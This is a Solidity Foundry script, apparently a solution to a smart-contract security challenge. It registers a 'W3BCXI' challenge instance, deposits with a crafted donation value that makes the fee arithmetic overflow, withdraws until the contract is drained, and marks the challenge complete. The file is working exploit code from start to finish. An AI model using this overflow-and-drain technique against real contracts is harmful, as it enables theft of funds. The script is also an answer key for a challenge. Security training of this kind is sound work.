// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {W3BCXI, W3bCXIFactory} from "../src/W3BCXI.sol";

contract ExploitScript is Script {
    W3bCXIFactory public factory;
    W3BCXI public target;
    address public attacker;

    function setUp() public {
        // Replace with actual factory address
        factory = W3bCXIFactory(0xAa7D7398193E9840326F291712aDc82bAa26C201);

        attacker = vm.addr(1);
        vm.deal(attacker, 1 ether);
    }

    function run() public {
        // vm.startBroadcast(attacker);

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        address player = vm.addr(deployerPrivateKey);

        console2.log("Player address:", player);

        vm.startBroadcast(deployerPrivateKey);

        // 1. Register and get our target contract
        address payable targetAddr = payable(
            factory.register("0xAa7D7398193E9840326F291712aDc82bAa26C201")
        );
        target = W3BCXI(targetAddr);
        console2.log("Deployed target contract at:", address(target));
        console2.log("Initial balance:", address(target).balance);

        // 2. Calculate values to cause overflow
        uint256 currentFeeBps = target.feeBps(); // 3141

        // We want (amount * (feeBps + donationBps)) / BASIS_POINTS to overflow
        uint256 donationBps = type(uint256).max - currentFeeBps + 1;

        // 3. Make multiple small deposits to maximize chance of successful exploit
        for (uint i = 0; i < 5; i++) {
            target.deposit{value: 100 wei}(attacker, donationBps);
            console2.log(
                "Balance after deposit",
                i,
                ":",
                address(target).balance
            );
        }

        // 4. Check our deposit amount
        uint256 depositAmount = target.viewDeposit(attacker);
        console2.log("Our deposit amount:", depositAmount);

        // 5. Withdraw
        target.withdraw();
        console2.log("Final contract balance:", address(target).balance);

        // 6. Verify and complete
        require(address(target).balance == 0, "Target not drained");
        bool success = factory.complete(address(target));
        require(success, "Challenge not completed");

        vm.stopBroadcast();
    }
}
